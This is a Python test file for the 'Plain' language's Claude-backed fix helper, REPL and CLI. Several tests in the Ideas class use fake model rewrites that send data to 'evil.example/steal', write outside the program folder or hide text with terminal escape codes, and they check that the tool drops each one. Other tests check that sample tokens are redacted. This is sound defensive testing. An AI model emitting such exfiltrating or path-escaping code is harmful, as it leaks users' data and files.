"""Fixes in the tools around the language: the Claude helper, the fixer, the REPL and the CLI."""

import contextlib
import io
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from .support import ROOT  # noqa: F401  (puts src on the path)
from .test_ai import FakeClient

from plainlang import ai, cli, fixer  # noqa: E402
from plainlang.hosts import TestHost  # noqa: E402
from plainlang.parser import Reader  # noqa: E402
from plainlang.repl import Session  # noqa: E402

REPORT = 'read "sales.csv" and call it sales\ncount up the sales over 100\nshow "done"\n'


def problem_of(source):
    program = Reader().read(source)
    return program, program.problems[0]


def quietly(func, *args, **kwargs):
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
        result = func(*args, **kwargs)
    return result, out.getvalue()


def session(lines, options=None, terminal=False):
    """A REPL session with scripted typing. Each item is typed, or raised if it's an exception."""
    typed = list(lines)
    shown = []

    def ask(prompt):
        if not typed:
            raise EOFError
        item = typed.pop(0)
        if isinstance(item, BaseException) or (isinstance(item, type) and issubclass(item, BaseException)):
            raise item
        return item

    host = TestHost(tempfile.mkdtemp())
    s = Session(options or {"ai": False}, ask=ask, show=shown.append, host=host)
    s.terminal = terminal
    s.loop()
    return shown, host, s


class Ideas(unittest.TestCase):
    """Claude's rewrites, checked the way design section 7 says."""

    def setUp(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        self.folder = Path(tempfile.mkdtemp())

    def ideas(self, rewrites, source=REPORT, why="", own_file=None, own_ideas=None):
        ai.CACHE = Path(tempfile.mkdtemp())
        program, problem = problem_of(source)
        answer = {"rewrites": [{"lines": lines, "why": why} for lines in rewrites], "unsupported": None}
        raw, _ = ai.ask_claude(program, problem, "report.plain", client=FakeClient(answer))
        own = problem.ideas if own_ideas is None else own_ideas
        return ai.checked_ideas(program, problem, raw, self.folder, own_ideas=own, own_file=own_file)

    def assertDropped(self, *lines, **kwargs):
        for line in lines:
            with self.subTest(line=line):
                self.assertEqual([], self.ideas([[line]], **kwargs))

    # tools-1
    def test_no_new_web_address_by_capitals_or_pieces(self):
        self.assertDropped('send sales to "HTTPS://evil.example/steal" and call it reply',
                           'send sales to "https:/{"/"}evil.example/steal" and call it reply',
                           'send sales to "{"https"}://evil.example/steal" and call it reply',
                           'read "HTTPS://evil.example/x?d={sales}" and call it reply')

    def test_no_web_address_built_from_names(self):
        self.assertEqual([], self.ideas([['set a to "htt"', 'set b to "ps:/"',
                                          'send sales to "{a}{b}/evil.example/steal" and call it reply']]))
        source = 'set address to "https://api.example.com/x"\nread "sales.csv" and call it sales\n' \
                 'post sales to address\nshow "done"\n'
        ideas = self.ideas([["send sales to address and call it reply"]], source=source)
        self.assertEqual(["sends data over the internet"], ideas[0][2])
        self.assertEqual([], self.ideas([['replace "api" with "evil" in address',
                                          "send sales to address and call it reply"]], source=source))

    def test_your_own_step_that_sends_is_labelled_and_checked(self):
        source = 'set address to "https://api.example.com/x"\nread "sales.csv" and call it sales\n' \
                 'pots sales to address\nshow "done"\n\nhow to post (data) to (url)\n' \
                 '    send data to url and call it reply\n'
        ideas = self.ideas([["post sales to address"]], source=source)
        self.assertEqual(["sends data over the internet"], ideas[0][2])
        self.assertEqual([], self.ideas([['set a to "htt"', 'set b to "ps:/"', 'post sales to "{a}{b}/evil.example"']],
                                        source=source))

    # tools-2
    def test_file_names_must_be_files_already_in_the_folder(self):
        own = self.folder / "report.plain"
        own.write_text(REPORT)
        (self.folder / "other.csv").write_text("a\n")
        self.assertDropped('save sales to "report.plain"', 'save sales to "evil.py"',
                           'save sales to "/tmp/plain_smuggle_test"', 'save sales to "~/plain_smuggle_test"',
                           'save sales to "{"other"}.csv"', 'save sales to "../outside.csv"',
                           'rename "report.plain" to "gone"', own_file=own)
        ideas = self.ideas([['save sales to "other.csv"']], own_file=own)
        self.assertEqual(["changes a file"], ideas[0][2])

    def test_a_file_in_a_folder_inside_the_programs_folder_is_fine(self):
        (self.folder / "data").mkdir()
        (self.folder / "data" / "big.csv").write_text("a\n")
        self.assertEqual(1, len(self.ideas([['save sales to "data/big.csv"']])))

    # tools-9
    def test_line_breaks_inside_a_line_count_as_lines(self):
        (self.folder / "other.csv").write_text("a\n")
        ideas = self.ideas([['show "counting"\nsave sales to "other.csv"']])
        self.assertEqual(['show "counting"', 'save sales to "other.csv"'], ideas[0][0])
        self.assertEqual(["changes a file"], ideas[0][2])
        self.assertEqual([], self.ideas([["\n".join(f'show "step {k}"' for k in range(40))]]))

    # tools-10
    def test_control_codes_drop_an_idea_and_are_cleaned_from_why(self):
        self.assertDropped('show the number of sales  # \x1b[2K\x1b[G  1) show "hi"\x1b[8m')
        ideas = self.ideas([["show the number of sales"]], why="Counts them.\x1b[8m")
        self.assertEqual("Counts them.[8m", ideas[0][1])
        self.assertEqual([], self.ideas([["show the number of sales"]], why="See https://evil.example/help"))

    def test_unsupported_is_cleaned_before_it_is_shown(self):
        answer = {"rewrites": [], "unsupported": "drawing\x1b[8m shapes"}
        self.assertEqual("drawing[8m shapes", ai.unsupported_note(answer, "draw a circle"))
        answer = {"rewrites": [], "unsupported": "this; see https://evil.example"}
        self.assertIsNone(ai.unsupported_note(answer, "draw a circle"))

    # tools-11
    def test_an_idea_that_breaks_another_line_is_dropped(self):
        source = "score is 0\nshow score\nshow Hello there\n"
        self.assertEqual([], self.ideas([["set points to 0"]], source=source, own_ideas=[]))

    def test_lines_below_a_longer_idea_keep_their_problems(self):
        source = "count up the totals\nshow Hello there\n"
        ideas = self.ideas([["set totals to a list of 1 and 2", "show the total of totals"]], source=source)
        self.assertEqual(1, len(ideas))

    # tools-15
    def test_claudes_indent_fix_is_kept(self):
        source = 'set x to 1\nif x is 1\nshow "one"\n'
        ideas = self.ideas([['    show "one"']], source=source)
        self.assertEqual([['    show "one"']], [i[0] for i in ideas])

    # tools-25
    def test_ideas_that_mean_the_same_count_once(self):
        ideas = self.ideas([['display "Hello there"'], ['show  "Hello there"'], ['show "Hello there"  # hi']],
                           source="show Hello there\n")
        self.assertEqual([], ideas)
        ideas = self.ideas([['display "Hello there"'], ['show  "Hello there"']], source="show Hello there\n",
                           own_ideas=[])
        self.assertEqual([['display "Hello there"']], [i[0] for i in ideas])

    # tools-26
    def test_effort_is_medium(self):          # the approved plan: effort "medium"
        program, problem = problem_of(REPORT)
        client = FakeClient({"rewrites": [], "unsupported": None})
        ai.ask_claude(program, problem, "report.plain", client=client)
        self.assertEqual("medium", client.calls[0]["output_config"]["effort"])


class Secrets(unittest.TestCase):
    """tools-3: secrets are hidden before anything is sent."""

    def sent(self, source):
        ai.CACHE = Path(tempfile.mkdtemp())
        program = Reader().read(source)
        client = FakeClient({"rewrites": [], "unsupported": None})
        ai.ask_claude(program, program.problems[-1], "x.plain", client=client)
        return client.calls[0]["messages"][0]["content"]

    def test_curly_quotes(self):
        self.assertNotIn("hunter2", self.sent("set password to “hunter2”\ncount it up\n"))

    def test_tokens_after_an_underscore(self):
        sent = self.sent('read "https://api.example.com/data?access=ghp_1234567890abcdefghijABCDEFGHIJ123456" '
                         'and call it data\ncount it up\n')
        self.assertNotIn("1234567890abcdefghijABCDEFGHIJ123456", sent)
        self.assertIn("https://api.example.com/data?access=[hidden", sent)

    def test_keys_with_slashes(self):
        sent = self.sent('set aws to "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\ncount it up\n')
        self.assertNotIn("EXAMPLEKEY", sent)


class Cache(unittest.TestCase):
    """tools-14: a damaged cached answer counts as missing."""

    def test_bad_shapes_are_asked_again(self):
        program, problem = problem_of(REPORT)
        good = {"rewrites": [{"lines": ["show the number of sales"], "why": ""}], "unsupported": None}
        for bad in (None, {"rewrites": [{"lines": ["show total", 7], "why": ""}], "unsupported": None},
                    {"rewrites": "show total", "unsupported": None}, [1, 2]):
            with self.subTest(bad=bad):
                ai.CACHE = Path(tempfile.mkdtemp())
                ai.ask_claude(program, problem, "report.plain", client=FakeClient(good))
                [path] = ai.CACHE.iterdir()
                path.write_text(json.dumps(bad))
                again = FakeClient(good)
                raw, _ = ai.ask_claude(program, problem, "report.plain", client=again)
                self.assertEqual(1, len(again.calls))
                self.assertEqual(good["rewrites"], raw["rewrites"])

    def test_a_bad_answer_from_claude_gives_no_ideas(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        program, problem = problem_of(REPORT)
        raw, _ = ai.ask_claude(program, problem, "report.plain", client=FakeClient({"rewrites": "no"}))
        self.assertEqual({"rewrites": [], "unsupported": None}, raw)


class Disclosure(unittest.TestCase):
    """tools-6, tools-13, tools-20: the 'This sends' line shows only when a request goes out."""

    def setUp(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        self.path = Path(tempfile.mkdtemp()) / "report.plain"

    def gather(self, source=REPORT, notes=None):
        program, problem = problem_of(source)
        return quietly(fixer.gather_ideas, program, problem, self.path, {"ai": True},
                       set() if notes is None else notes)

    def test_nothing_is_said_to_be_sent_without_the_package(self):
        notes = set()
        _, out = self.gather(notes=notes)
        self.assertNotIn("This sends", out)
        self.assertIn("Tip: Plain can also ask Claude for ideas. Add it with: pipx inject plainlang anthropic", out)
        _, out = self.gather(notes=notes)
        self.assertEqual("", out)

    def test_the_line_names_the_lines_sent(self):
        client = FakeClient({"rewrites": [], "unsupported": None})
        with mock.patch.object(ai, "make_client", lambda: (None, client)):
            _, out = self.gather()
            self.assertIn("Asking Claude for ideas. This sends lines 1 to 3 of report.plain to Anthropic", out)
            _, out = self.gather()       # from the cache: nothing is sent
            self.assertNotIn("This sends", out)
        self.assertEqual(1, len(client.calls))

    # tools-15
    def test_claude_isnt_asked_about_how_far_a_line_is_moved(self):
        client = FakeClient({"rewrites": [], "unsupported": None})
        with mock.patch.object(ai, "make_client", lambda: (None, client)):
            _, out = self.gather('set x to 1\nif x is 1\nshow "one"\n')
        self.assertEqual([], client.calls)
        self.assertNotIn("This sends", out)

    def test_a_long_file_names_only_the_lines_around_the_problem(self):
        source = "".join(f'show "line {k}"\n' for k in range(1, 150)) + "count up the totals\n" + \
            "".join(f'show "line {k}"\n' for k in range(151, 301))
        client = FakeClient({"rewrites": [], "unsupported": None})
        with mock.patch.object(ai, "make_client", lambda: (None, client)):
            _, out = self.gather(source)
        self.assertIn("This sends lines 120 to 180 of report.plain", out)


class Fixing(unittest.TestCase):
    def setUp(self):
        self.folder = Path(tempfile.mkdtemp())

    def fix(self, text, answers, name="hello.plain"):
        path = self.folder / name
        path.write_bytes(text.encode())
        typed = list(answers)

        def ask(prompt):
            if not typed:
                raise EOFError
            return typed.pop(0)

        (fixed, new_text), out = quietly(fixer.fix_file, path, text, Reader().read(text), {"ai": False}, ask=ask)
        return fixed, path, out

    # tools-5
    def test_end_of_input_skips(self):
        fixed, path, out = self.fix("show Hello there\n", [])
        self.assertIsNone(fixed)
        self.assertEqual("show Hello there\n", path.read_text())
        self.assertIn("still has 1 line Plain can't follow", out)

    # tools-12
    def test_a_lone_cr_ends_a_line(self):
        fixed, path, _ = self.fix('set x to 1\rshow "a"\nshow Hello there\n', ["1"])
        self.assertIsNotNone(fixed)
        self.assertEqual(b'set x to 1\rshow "a"\nshow "Hello there"\n', path.read_bytes())
        fixed, path, _ = self.fix("set x to 1\rshow Hello there\r", ["1"])
        self.assertEqual(b'set x to 1\rshow "Hello there"\r', path.read_bytes())

    def test_each_line_keeps_its_own_newline(self):
        out = fixer.splice('a\r\nshow Hello\nc\n', 2, ['if x is 1', '    show "Hello"'])
        self.assertEqual('a\r\nif x is 1\n    show "Hello"\nc\n', out)

    # tools-24
    @unittest.skipIf(os.name == "nt" or os.geteuid() == 0, "needs a folder you can't change")
    def test_a_folder_you_cant_change(self):
        path = self.folder / "a.plain"
        path.write_text("show Hello there\n")
        os.chmod(self.folder, 0o555)
        try:
            (fixed, _), out = quietly(fixer.fix_file, path, path.read_text(), Reader().read(path.read_text()),
                                      {"ai": False}, ask=lambda prompt: "1")
            self.assertIsNone(fixed)
            self.assertIn('Check that you\'re allowed to change "a.plain" and its folder.', out)
            tidy = self.folder / "b.plain"
            os.chmod(self.folder, 0o755)
            tidy.write_text('display "hi"\n')
            os.chmod(self.folder, 0o555)
            code, out = quietly(cli.main, ["tidy", str(tidy)])
            self.assertEqual(1, code)
            self.assertIn('Check that you\'re allowed to change "b.plain" and its folder.', out)
        finally:
            os.chmod(self.folder, 0o755)


class Command(unittest.TestCase):
    # tools-8
    @unittest.skipIf(os.name == "nt" or os.geteuid() == 0, "needs a file you can't read")
    def test_a_file_you_cant_read(self):
        path = Path(tempfile.mkdtemp()) / "locked.plain"
        path.write_text('show "hi"\n')
        os.chmod(path, 0)
        try:
            code, out = quietly(cli.main, ["run", str(path)])
        finally:
            os.chmod(path, 0o644)
        self.assertEqual(2, code)
        self.assertEqual('Check that you\'re allowed to read "locked.plain". Plain can\'t open it.\n', out)

    # tools-27
    def test_phrases_knows_other_words(self):
        for word, phrase in (("display", "show VALUE"), ("fetch", "read FILE"), ("else", "otherwise")):
            with self.subTest(word=word):
                code, out = quietly(cli.phrases, [word])
                self.assertEqual(0, code)
                self.assertIn(phrase, out)

    def test_other_words_work(self):
        folder = Path(tempfile.mkdtemp())
        (folder / "todos.txt").write_text("a\nb\n")
        program = Reader().read('load the lines of "todos.txt" and call it todos\ndisplay todos\n')
        self.assertEqual([], program.problems)


class Repl(unittest.TestCase):
    # tools-4
    def test_run_keeps_your_options(self):
        seen = []
        folder = Path(tempfile.mkdtemp())
        (folder / "dice.plain").write_text("show a random number from 1 to 1000000\n")
        with mock.patch.object(cli, "run_command", lambda command, path, text, options: seen.append(options)):
            session([f":run {folder / 'dice.plain'}"], options={"ai": False, "seed": 7})
        self.assertEqual([{"ai": False, "seed": 7}], seen)

    # tools-5
    def test_end_of_input_at_the_pick(self):
        shown, host, _ = session(["show Hello there"])
        self.assertTrue(any("Put the text in double quotes." in s for s in shown))
        self.assertEqual([], host.transcript)

    # tools-7
    def test_save_to_a_missing_folder_or_a_folder(self):
        folder = Path(tempfile.mkdtemp())
        (folder / "adir.plain").mkdir()
        shown, host, _ = session(["set x to 3", f":save {folder / 'nofolder' / 'mine'}", f":save {folder / 'adir'}",
                                  "show x"])
        self.assertIn(f'Check the folder name "{folder / "nofolder"}". There\'s no folder with that name here.', shown)
        self.assertIn(f'Choose a different name after :save. "{folder / "adir.plain"}" is a folder.', shown)
        self.assertEqual(["3"], host.transcript)

    # tools-16
    def test_claude_fills_the_ideas_in_a_terminal(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        client = FakeClient({"rewrites": [{"lines": ["show the total of totals"], "why": "Adds them up."}],
                             "unsupported": None})
        folder = Path(tempfile.mkdtemp())
        with mock.patch.object(ai, "make_client", lambda: (None, client)):
            shown, host, s = session(["set totals to a list of 1, 2 and 3", "count up the totals", "1",
                                      f":save {folder / 'mine'}"], options={"ai": True}, terminal=True)
        self.assertEqual(1, len(client.calls))
        self.assertIn("  1) show the total of totals    (from Claude)", shown)
        self.assertEqual(["6"], host.transcript)
        self.assertEqual("set totals to a list of 1, 2 and 3\nshow the total of totals\n",
                         (folder / "mine.plain").read_text())

    def test_no_claude_outside_a_terminal(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        client = FakeClient({"rewrites": [], "unsupported": None})
        with mock.patch.object(ai, "make_client", lambda: (None, client)):
            session(["count up the totals"], options={"ai": True}, terminal=False)
        self.assertEqual([], client.calls)

    # tools-17
    def test_ctrl_c_throws_away_the_steps_being_typed(self):
        shown, host, _ = session(["repeat 2 times", '    show "cancelled"', KeyboardInterrupt, 'show "next"'])
        self.assertEqual(["next"], host.transcript)
        self.assertIn("Cancelled. Those steps didn't run.", shown)

    def test_ctrl_c_while_waiting_for_claude_keeps_the_session(self):
        ai.CACHE = Path(tempfile.mkdtemp())

        def interrupted():
            raise KeyboardInterrupt
        with mock.patch.object(ai, "make_client", interrupted):
            shown, host, _ = session(["set total to 41", "count up the totals", "show total plus 1"],
                                     options={"ai": True}, terminal=True)
        self.assertEqual(["42"], host.transcript)
        self.assertIn("Stopped.", shown)

    def test_ctrl_c_at_the_prompt_keeps_the_session(self):
        shown, host, _ = session(["set total to 41", KeyboardInterrupt, "show total plus 1"])
        self.assertEqual(["42"], host.transcript)
        self.assertIn("Type :quit to leave.", shown)

    # tools-18
    def test_a_how_to_written_again_replaces_the_old_one(self):
        folder = Path(tempfile.mkdtemp())
        shown, host, _ = session(["how to greet (person)", '    show "Hi, {person}!"', "",
                                  "how to greet (person)", '    show "Hello, {person}!"', "",
                                  'greet "Ann"', f":save {folder / 'mine'}"])
        self.assertEqual(["Hello, Ann!"], host.transcript)
        self.assertIn('Replaced your earlier "how to greet (person)".', shown)
        saved = (folder / "mine.plain").read_text()
        self.assertEqual([], Reader().read(saved).problems)
        self.assertNotIn("Hi,", saved)

    def test_a_how_to_with_a_problem_keeps_the_old_one(self):
        shown, host, _ = session(["how to greet (person)", '    show "Hi, {person}!"', "",
                                  "how to greet (person)", "    show Hello there", "", "",
                                  'greet "Ann"'])
        self.assertEqual(["Hi, Ann!"], host.transcript)

    # tools-19
    def test_a_problem_in_an_earlier_how_to_shows_its_line(self):
        shown, host, _ = session(["how to halve (n)", "    show 10 divided by n", "",
                                  "repeat 1 times", '    show "starting"', "    halve 0", ""])
        message = next(s for s in shown if "while running" in s)
        self.assertTrue(message.startswith('your "how to halve (n)", line 2, while running: '), message)
        self.assertIn("\n        show 10 divided by n\n", message)

    # tools-21, tools-22, tools-23
    def test_repl_words(self):
        shown, _, _ = session(["set age to 3", "agee", "", ":run", "zork the price"])
        text = "\n".join(shown)
        self.assertIn('your step: Write "age" instead of "agee".', text)
        self.assertIn('Why: You set "age" in an earlier step. Nothing in your steps sets "agee".', text)
        self.assertIn("Type a file name after :run, like this: :run hello.plain", text)
        self.assertIn("Start this line with a step Plain knows. Type :phrases to see them all.", text)
        self.assertNotIn("plain phrases", text)

    def test_phrases_hint_in_the_repl(self):
        (_, _, _), out = quietly(session, [":phrases zebra"])
        self.assertIn('Plain has no phrases about "zebra". Type :phrases to see them all.', out)

    def test_a_value_with_a_typo_points_at_the_name(self):
        shown, host, _ = session(["set price to 4.50", "prise times 2", "1"])
        self.assertTrue(any(s.startswith('your step: Write "price" instead of "prise".') for s in shown), shown)
        self.assertIn("  1) price times 2", shown)
        self.assertIn("9.00", shown)


if __name__ == "__main__":
    unittest.main()
